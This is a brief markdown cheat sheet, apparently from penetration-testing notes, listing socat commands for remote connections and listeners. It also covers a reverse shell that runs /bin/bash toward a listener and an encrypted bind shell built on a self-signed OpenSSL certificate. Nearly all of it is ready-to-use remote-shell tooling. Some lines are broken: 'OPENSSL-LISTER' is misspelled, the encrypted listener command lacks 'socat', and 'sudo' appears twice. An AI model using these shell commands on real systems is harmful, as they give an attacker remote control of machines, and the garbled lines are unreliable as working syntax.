# Socat Shells 


```bash
# Connect to remote host
$ socat - TCP:<remote host address>:443
```

```bash
# Create a listener 
$ sudo sudo socat TCP4-LISTEN:443 STDOUT
```

```bash
# Send a reverse shell 
[Windows] socat -d -d TCP4-LISTEN:443 STDOUT
[Kali] socat TCP:<listener ip address>:443 EXEC:/bin/bash
```

```bash
# Encrpted bind shells (Create cert, set up listener, connect to shell)
# Use OpenSSL to create a self-signed cert
$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
$ cat bind_shell.key bind_shell.crt > bind_shell.pem

# Create the encrypted socat listener
$ sudo OPENSSL-LISTER:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash

# Connect to the encrypted socat shell
> socat - OPENSSL:<listener ip address>:443,verify=0
```
